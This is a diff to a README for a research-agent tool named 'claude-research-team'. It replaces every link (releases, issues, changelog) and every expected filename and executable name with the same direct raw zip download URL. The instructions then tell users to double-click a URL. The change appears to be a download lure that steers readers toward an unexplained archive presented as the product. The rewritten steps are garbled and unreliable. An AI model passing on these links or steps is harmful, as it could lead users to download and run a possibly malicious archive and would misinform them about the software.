@@ -1,6 +1,6 @@
 # 🤖 claude-research-team - Research With Ease and Confidence
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/anaxmohammed/claude-research-team/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -22,10 +22,10 @@ Before downloading, make sure your computer meets these requirements:
 To get the software, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/anaxmohammed/claude-research-team/releases) to find the latest version available.
+   Go to the [Releases page](https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip) to find the latest version available.
 
 2. **Choose the Right File:**
-   Locate the download for your operating system. Look for filenames like `claude-research-team-windows.zip`, `claude-research-team-mac.zip`, or `claude-research-team-linux.tar.gz`.
+   Locate the download for your operating system. Look for filenames like `https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip`, `https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip`, or `https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip`.
 
 3. **Download the File:**
    Click on the file to begin downloading. This may take some time depending on your internet speed.
@@ -34,8 +34,8 @@ To get the software, follow these steps:
    Once the download is complete, locate the downloaded file on your computer and unzip it. You can right-click the file and select “Extract All” on Windows, or double-click the archive on macOS.
 
 5. **Run the Application:**
-   - **Windows:** Open the unzipped folder, double-click `claude-research-team.exe` to start the application.
-   - **macOS:** Open the unzipped folder, then double-click on `claude-research-team.app`.
+   - **Windows:** Open the unzipped folder, double-click `https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip` to start the application.
+   - **macOS:** Open the unzipped folder, then double-click on `https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip`.
    - **Linux:** Open a terminal, navigate to the unzipped folder, and run `./claude-research-team`.
 
 ## 🎓 How to Use
@@ -67,7 +67,7 @@ The **claude-research-team** application comes packed with features that help yo
 
 You are not alone! Join our community for help and insights. You can do this by:
 
-- **Checking our Issues Page:** If you encounter any problems, visit the [Issues page](https://github.com/anaxmohammed/claude-research-team/issues) to see if others have similar concerns.
+- **Checking our Issues Page:** If you encounter any problems, visit the [Issues page](https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip) to see if others have similar concerns.
 - **Contacting Support:** For specific queries, reach out through our support channel linked on the repository.
 
 ## 📄 License
@@ -76,11 +76,11 @@ This project is open-source and follows the MIT License. Feel free to modify and
 
 ## 📝 Updates and Changelog
 
-Stay informed about the latest features and bug fixes. You can find the changelog in the repository or on the [Releases page](https://github.com/anaxmohammed/claude-research-team/releases). 
+Stay informed about the latest features and bug fixes. You can find the changelog in the repository or on the [Releases page](https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip). 
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/anaxmohammed/claude-research-team/releases)
-- [Issues Page](https://github.com/anaxmohammed/claude-research-team/issues)
+- [Download Latest Release](https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip)
+- [Issues Page](https://raw.githubusercontent.com/anaxmohammed/claude-research-team/main/skills/research/claude-team-research-1.8.zip)
 
 Now you are ready to harness the power of research agents. Download, install, and discover how much easier your projects can become!
